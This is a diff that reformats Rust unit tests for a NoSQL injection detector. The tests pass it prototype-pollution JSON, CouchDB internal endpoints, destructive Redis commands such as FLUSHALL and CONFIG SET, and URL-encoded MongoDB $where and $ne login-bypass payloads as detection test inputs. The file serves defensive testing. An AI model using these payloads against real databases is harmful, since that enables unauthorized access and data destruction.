-        assert!(nosql_analyzer_score(r#"{"__proto__": {"isAdmin": true}}"#) > 0,
-            "Should detect __proto__ pollution");
-        assert!(nosql_analyzer_score(r#"{"constructor": {"prototype": {}}}"#) > 0,
-            "Should detect constructor pollution");
-        assert!(nosql_analyzer_score(r#"{"prototype": {"polluted": true}}"#) > 0,
-            "Should detect direct prototype pollution");
+        assert!(
+            nosql_analyzer_score(r#"{"__proto__": {"isAdmin": true}}"#) > 0,
+            "Should detect __proto__ pollution"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"constructor": {"prototype": {}}}"#) > 0,
+            "Should detect constructor pollution"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"prototype": {"polluted": true}}"#) > 0,
+            "Should detect direct prototype pollution"
+        );
     }
 
     /// Test NoSQL detection for CouchDB special endpoints.
     #[test]
     fn test_nosql_analyzer_couchdb() {
-        assert!(nosql_analyzer_score("/_all_docs") > 0,
-            "Should detect _all_docs endpoint");
-        assert!(nosql_analyzer_score("/_design/mydesign/_view/myview") > 0,
-            "Should detect _design/_view endpoints");
-        assert!(nosql_analyzer_score("/_changes?since=0") > 0,
-            "Should detect _changes endpoint");
+        assert!(
+            nosql_analyzer_score("/_all_docs") > 0,
+            "Should detect _all_docs endpoint"
+        );
+        assert!(
+            nosql_analyzer_score("/_design/mydesign/_view/myview") > 0,
+            "Should detect _design/_view endpoints"
+        );
+        assert!(
+            nosql_analyzer_score("/_changes?since=0") > 0,
+            "Should detect _changes endpoint"
+        );
     }
 
     /// Test NoSQL detection for Redis dangerous commands.
     #[test]
     fn test_nosql_analyzer_redis() {
-        assert!(nosql_analyzer_score("EVAL \"return 1\" 0") > 0,
-            "Should detect EVAL command");
-        assert!(nosql_analyzer_score("FLUSHALL") > 0,
-            "Should detect FLUSHALL command");
-        assert!(nosql_analyzer_score("CONFIG SET dir /tmp") > 0,
-            "Should detect CONFIG command");
-        assert!(nosql_analyzer_score("KEYS *") > 0,
-            "Should detect KEYS command");
+        assert!(
+            nosql_analyzer_score("EVAL \"return 1\" 0") > 0,
+            "Should detect EVAL command"
+        );
+        assert!(
+            nosql_analyzer_score("FLUSHALL") > 0,
+            "Should detect FLUSHALL command"
+        );
+        assert!(
+            nosql_analyzer_score("CONFIG SET dir /tmp") > 0,
+            "Should detect CONFIG command"
+        );
+        assert!(
+            nosql_analyzer_score("KEYS *") > 0,
+            "Should detect KEYS command"
+        );
     }
 
     /// Test NoSQL detection for URL-encoded bypasses.
     #[test]
     fn test_nosql_analyzer_url_encoded() {
         // URL-encoded "$where": pattern (%24 = $, %22 = ", %3A = :)
-        assert!(nosql_analyzer_score("%22%24where%22%3A") > 0,
-            "Should detect URL-encoded \"$where\":");
+        assert!(
+            nosql_analyzer_score("%22%24where%22%3A") > 0,
+            "Should detect URL-encoded \"$where\":"
+        );
         // URL-encoded {"$ne": ""} pattern
-        assert!(nosql_analyzer_score("%7B%22password%22%3A%7B%22%24ne%22%3A%22%22%7D%7D") > 0,
-            "Should detect URL-encoded password $ne bypass");
+        assert!(
+            nosql_analyzer_score("%7B%22password%22%3A%7B%22%24ne%22%3A%22%22%7D%7D") > 0,
+            "Should detect URL-encoded password $ne bypass"
+        );
         // URL-encoded __proto__
-        assert!(nosql_analyzer_score("%22__proto__%22%3A") > 0,
-            "Should detect URL-encoded __proto__");
+        assert!(
+            nosql_analyzer_score("%22__proto__%22%3A") > 0,
+            "Should detect URL-encoded __proto__"
+        );
     }
 
     /// Test that legitimate JSON queries are not flagged.
     #[test]
     fn test_nosql_analyzer_false_positives() {
         // Normal JSON
-        assert!(nosql_analyzer_score(r#"{"name": "John", "age": 30}"#) == 0,
-            "Should not flag normal JSON");
-        assert!(nosql_analyzer_score(r#"{"status": "active"}"#) == 0,
-            "Should not flag simple key-value");
+        assert!(
+            nosql_analyzer_score(r#"{"name": "John", "age": 30}"#) == 0,
+            "Should not flag normal JSON"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"status": "active"}"#) == 0,
+            "Should not flag simple key-value"
+        );
         // Normal text
-        assert!(nosql_analyzer_score("hello world") == 0,
-            "Should not flag normal text");
-        assert!(nosql_analyzer_score("user@example.com") == 0,
-            "Should not flag email");
+        assert!(
+            nosql_analyzer_score("hello world") == 0,
+            "Should not flag normal text"
+        );
+        assert!(
+            nosql_analyzer_score("user@example.com") == 0,
+            "Should not flag email"
+        );
     }
 
     #[test]
